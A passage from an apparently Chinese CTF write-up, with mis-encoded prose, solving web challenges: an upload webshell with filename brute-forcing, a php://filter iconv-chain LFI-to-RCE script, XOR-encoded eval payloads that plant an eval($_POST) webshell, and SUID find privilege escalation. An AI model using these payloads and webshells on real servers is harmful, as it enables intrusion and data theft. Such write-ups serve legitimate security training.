class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /change.php HTTP/1.1</span><br><span class="line">------WebKitFormBoundaryLjuFMGS9hc3RMksx</span><br><span class="line">Content-Disposition: form-data; name=&quot;avatar&quot;; filename=&quot;1.php&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php system(&quot;cat /flag&quot;);</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ ï¼ŒåŒæ—¶çˆ†ç ´æ–‡ä»¶åï¼š<code>https://3v4l.org/UvLQQ#v8.0.30</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">php_mt_seed</span>(<span class="params"><span class="variable">$seed</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="variable">$seed</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$x</span> = <span class="title function_ invoke__">time</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$k</span>=-<span class="number">20</span>;<span class="variable">$k</span>&lt;<span class="number">20</span>;<span class="variable">$k</span>++) &#123;</span><br><span class="line">    <span class="variable">$seed</span> = <span class="variable">$x</span>+<span class="variable">$k</span>;</span><br><span class="line">    <span class="title function_ invoke__">php_mt_seed</span>(<span class="variable">$seed</span>);</span><br><span class="line">    <span class="variable">$characters</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$newFileName</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">10</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$newFileName</span> .= <span class="variable">$characters</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$characters</span>) - <span class="number">1</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$newFileName</span>.<span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°çš„æ–‡ä»¶åï¼Œçˆ†ç ´å…¶å­˜åœ¨æ€§ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">rand = <span class="string">&#x27;nMa3orDC2e|sso43vzOmv|3cLxYQjVCU|bfcsVjUjUc|DGUxICjb62|4agL09NVrj|vCY0Ii09gS|KEC5rjXegm|14Bl45OsHh|zgbN7myZbJ|Q67hx4uRVf|E4SQRpukkv|31A7kBmcpB|3J5Pj4Yfeb|zXfWAa86o5|5KMdsa0Uo0|btCM1eO8wo|maZNliuB1R|Y836Rhmpca|YreAYs4dbp|uK4nhxkdkw|4utkLM9gE7|TYekFoXTXJ|JSP6Hx0vyI|kzjZoBiv9R|EtQZUROvnh|HcTSaxtIXF|GmQhLWWoQ7|3PefcQupE7|Ctbc67MqB4|U55i5C09vA|ZqeKQ6yJSV|ufP5AUtnC6|yiYrEYIAgg|mHwm6SFE0K|q8PwOK5E2U|kBwsskBu0h|AlYCggPR8d|25Lmp0TH9E|2VDW4pida7|&#x27;</span>.<span class="title function_ invoke__">split</span>(<span class="string">&#x27;|&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;https://s5bwqhfkrgtcnancf0t3vxkgq.node.game.sycsec.com/upload/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="title function_ invoke__">len</span>(rand)):</span><br><span class="line">    u = url + rand[i] + <span class="string">&#x27;.php&#x27;</span></span><br><span class="line">    r=requests.<span class="title function_ invoke__">get</span>(u)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">print</span>(u)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>è®¿é—®å³å¯å¾—flagã€‚</p><p>â€‹</p><h3 id="ezrfi"><a href="#ezrfi" class="headerlink" title="ezrfi"></a>ezrfi</h3><blockquote><p>äº²çˆ±çš„Syclover,ä½ èƒ½æ‰¾åˆ°flagå—????</p></blockquote><p>åªèƒ½è¯»pyæ–‡ä»¶ï¼Œè¯•å‡º <code>?file=/var/hint</code></p><p><code>secret=&quot;w5YubyBvd08gMHcwIG92MCDDlndvIE8ubyAwLjAgMC5vIMOWdjAgMHbDliBPdjAgT3fDliBvLk8gw5Z2TyAwXzAgMF9PIG8uTyAwdjAgw5ZfbyBPd28gw5Z2TyDDli5PIMOWXzAgTy5PIMOWXzAgMHbDliAwLjAgw5Z2w5Ygw5Z3MCBPdsOWIMOWdjAgT1/DliDDlnZPIMOWLk8gw5Z3MCBvd8OWIMOWLm8gTy5vIMOWXzAgMHbDliDDlndvIE93w5YgTy5vIE93TyBvX28gw5YuTyBvLm8gb3dPIMOWXzAgb3dPIMOWXzAgMHZvIG8uTyBPd8OWIE92byAwLsOWIMOWdjAgTy7DliAwLjAgMHfDliBvLsOWIG93byBvdzAgMHZvIMOWLm8gb3dPIG9fMCDDli5PIG9fbyBPd8OWIE8ubyBvdzAgw5ZfbyBvd28gw5YuMCDDlnZPIG9fTyBPLsOWIE92MCBPdzAgby7DliAwdjAgT3YwIE9fTyBvLk8gT3bDliDDlnYwIMOWXzAgw5Z3byBvd08gT19vIE93w5Ygby5PIMOWdk8gby4wIDBfMCDDll9vIG93TyBPXzAgMC7DliDDli5vIE8uTyBPdzAgT19vIMOWdjAgb3cwIMOWdjAgT18wIMOWdm8gw5Z2w5Ygw5ZfbyAwX8OWIMOWdm8gw5Z2w5YgMHcwIE92w5Ygw5YubyDDli4wIMOWLm8gb3ZvIMOWLjAgw5YuMCAwd28gb3dPIG8uTyAwd8OWIDB2MCBvd8OWIMOWdzAgw5YubyAwdzAgT1/DliBvX08gw5Z2byAg&quot;</code></p><p>base64è§£å¯†å¾—ï¼š</p><p><code>Ã–.o owO 0w0 ov0 Ã–wo O.o 0.0 0.o Ã–v0 0vÃ– Ov0 OwÃ– o.O Ã–vO 0_0 0_O o.O 0v0 Ã–_o Owo Ã–vO Ã–.O Ã–_0 O.O Ã–_0 0vÃ– 0.0 Ã–vÃ– Ã–w0 OvÃ– Ã–v0 O_Ã– Ã–vO Ã–.O Ã–w0 owÃ– Ã–.o O.o Ã–_0 0vÃ– Ã–wo OwÃ– O.o OwO o_o Ã–.O o.o owO Ã–_0 owO Ã–_0 0vo o.O OwÃ– Ovo 0.Ã– Ã–v0 O.Ã– 0.0 0wÃ– o.Ã– owo ow0 0vo Ã–.o owO o_0 Ã–.O o_o OwÃ– O.o ow0 Ã–_o owo Ã–.0 Ã–vO o_O O.Ã– Ov0 Ow0 o.Ã– 0v0 Ov0 O_O o.O OvÃ– Ã–v0 Ã–_0 Ã–wo owO O_o OwÃ– o.O Ã–vO o.0 0_0 Ã–_o owO O_0 0.Ã– Ã–.o O.O Ow0 O_o Ã–v0 ow0 Ã–v0 O_0 Ã–vo Ã–vÃ– Ã–_o 0_Ã– Ã–vo Ã–vÃ– 0w0 OvÃ– Ã–.o Ã–.0 Ã–.o ovo Ã–.0 Ã–.0 0wo owO o.O 0wÃ– 0v0 owÃ– Ã–w0 Ã–.o 0w0 O_Ã– o_O Ã–vo</code></p><p>å°Šå˜Ÿå‡å˜Ÿè§£ç ï¼š</p><p><code>Shy0JhFpsi+njV0IfFfzS44KIcwPFg312qo6gfdk0+DzcoMdSgVs15cERxpqnPJh4Y3b3i/mcbkPlHGTIA6/A8CQU8UX6j9w5HKy</code></p><p>æ ¹æ®æç¤ºRC4è§£ç ï¼Œkey=Sycloverï¼Œå¾—ï¼š</p><p><code>æ–‡ä»¶åŒ…å«é€»è¾‘æ˜¯include($file.&quot;.py&quot;),ä½ èƒ½æ‰¾åˆ°flagæ–‡ä»¶ä½ç½®å—??</code></p><p>å‚è€ƒï¼š <a target="_blank" rel="noopener" href="https://k1te.cn/2022/01/10/LFIå­¦ä¹ /">LFI æ–°å§¿åŠ¿å­¦ä¹ </a>ï¼Œä½¿ç”¨æ–‡ä»¶åŒ…å«RCEï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://bhhtut26mxsa9f29ft8jg5y5p.node.game.sycsec.com/index.php&quot;</span></span><br><span class="line">file_to_use = <span class="string">&quot;/var/hint&quot;</span></span><br><span class="line">command = <span class="string">&quot;cat /ffffffllllag&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#&lt;?=`$_GET[0]`;;?&gt;</span></span><br><span class="line">base64_payload = <span class="string">&quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;</span></span><br><span class="line"></span><br><span class="line">conversions = &#123;</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;P&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Y&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># generate some garbage base64</span></span><br><span class="line">filters = <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span></span><br><span class="line">filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line"><span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line">filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> base64_payload[::-<span class="number">1</span>]:</span><br><span class="line">        filters += conversions[c] + <span class="string">&quot;|&quot;</span></span><br><span class="line">        <span class="comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-decode|&quot;</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line">        <span class="comment"># get rid of equal signs</span></span><br><span class="line">        filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line">filters += <span class="string">&quot;convert.base64-decode&quot;</span></span><br><span class="line"></span><br><span class="line">final_payload = <span class="string">f&quot;php://filter/<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;file_to_use&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">r = requests.get(url, params=&#123;</span><br><span class="line">    <span class="string">&quot;0&quot;</span>: command,</span><br><span class="line">    <span class="string">&quot;file&quot;</span>: final_payload</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># SYC&#123;The PhpFFffilter 0n File-include vulnerabilities is s0 Amazing!!#@##&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="EzRce"><a href="#EzRce" class="headerlink" title="EzRce"></a>EzRce</h3><blockquote><p>can you rce me??? flagä¸­ç©ºæ ¼è¯·ç”¨ä¸‹åˆ’çº¿æ›¿ä»£</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;waf.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$data</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;no!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></blockquote><p>ç›²è¯•wafï¼Œä¸ºæ— å­—æ¯æ•°å­—RCEï¼Œå¼‚æˆ–å¯ç”¨ï¼Œå°†æ¯ä¸ªå­—ç¬¦å¼‚æˆ– <code>%A0</code> å¾—åˆ°ä¸å¯è§å­—ç¬¦ã€‚</p><p><code>phpinfo();</code>ï¼š</p><p><code>?data=(%A0%A0%A0%A0%A0%A0%A0^%D0%C8%D0%C9%CE%C6%CF)();</code></p><p>çœ‹åˆ°disable_functionç¦ç”¨äº†ï¼š</p><p><code>exec,system,fwrite,passthru,popen,shell_exec,error_log,fputs,file_get_contents,assert,call_user_func,call_user_func_array,array_map,array_filter,array_reduce,get_defined_vars,getallheaders</code></p><p>è¯»waf - <code>readgzfile(&#39;waf.php&#39;);</code>ï¼š</p><p><code>?data=(%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0^%D2%C5%C1%C4%C7%DA%C6%C9%CC%C5)(%A0%A0%A0%A0%A0%A0%A0^%D7%C1%C6%8E%D0%C8%D0);</code></p><p>waf.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[b-df-km-uw-z0-9\+\~\&#123;\&#125;]+/i&#x27;</span>,<span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> False;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> True;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†™é©¬ - <code>file_put_contents(&#39;2.php&#39;,&#39;&lt;?php eval($_POST[1]);&#39;);</code>ï¼š</p><p><code>?data=(%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0^%C6%C9%CC%C5%FF%D0%D5%D4%FF%C3%CF%CE%D4%C5%CE%D4%D3)((%A0%A0%A0%A0%A0^%92%8E%D0%C8%D0),(%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0^%9C%9F%D0%C8%D0%80%C5%D6%C1%CC%88%84%FF%F0%EF%F3%F4%FB%91%FD%89%9B));</code></p><p>èšå‰‘è¿æ¥ï¼Œ<code>find / -perm -u=s -type f 2&gt;/dev/null</code> å‘ç° <code>/usr/bin/find</code> æœ‰ SUIDæƒé™ï¼Œ</p><p>findææƒï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">touch abcd</span><br><span class="line">find abcd -exec cat /flag \;</span><br></pre></td></tr></table></figure><p>å¾—flagï¼š<code>SYC&#123;ThE_RCe is S0 Eas1ly_DD!&#125;</code></p><p>â€‹</p><h3 id="ezpython"><a href="#ezpython" class="headerlink" title="ezpython"></a>ezpython</h3><blockquote><p>can you pollute me?</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> waf <span class="keyword">import</span> waf</span><br><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template,request,redirect,url_for,session,render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key=<span class="string">&#x27;jjjjggggggreekchallenge202333333&#x27;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username=<span class="string">&quot;&quot;</span></span><br><span class="line">        self.password=<span class="string">&quot;&quot;</span></span><br><span class="line">        self.isvip=<span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">hhh</span>(<span class="title class_ inherited__">User</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username=<span class="string">&quot;&quot;</span></span><br><span class="line">        self.password=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">registered_users=[]</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():  <span class="comment"># put application&#x27;s code here</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;welcome.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/play&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">play</span>():</span><br><span class="line">    username=session.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> username:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,name=username)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username=request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password=request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        user = <span class="built_in">next</span>((user <span class="keyword">for</span> user <span class="keyword">in</span> registered_users <span class="keyword">if</span> user.username == username <span class="keyword">and</span> user.password == password), <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> user:</span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = user.username</span><br><span class="line">            session[<span class="string">&#x27;password&#x27;</span>]=user.password</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;play&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Invalid login&quot;</span></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;play&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> waf(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;fuck payload!Hacker!!!&quot;</span></span><br><span class="line">            data=json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;è¿ç”¨æˆ·åå¯†ç éƒ½æ²¡æœ‰ä½ æ³¨å†Œå•¥å‘¢&quot;</span></span><br><span class="line">            user=hhh()</span><br><span class="line">            merge(data,user)</span><br><span class="line">            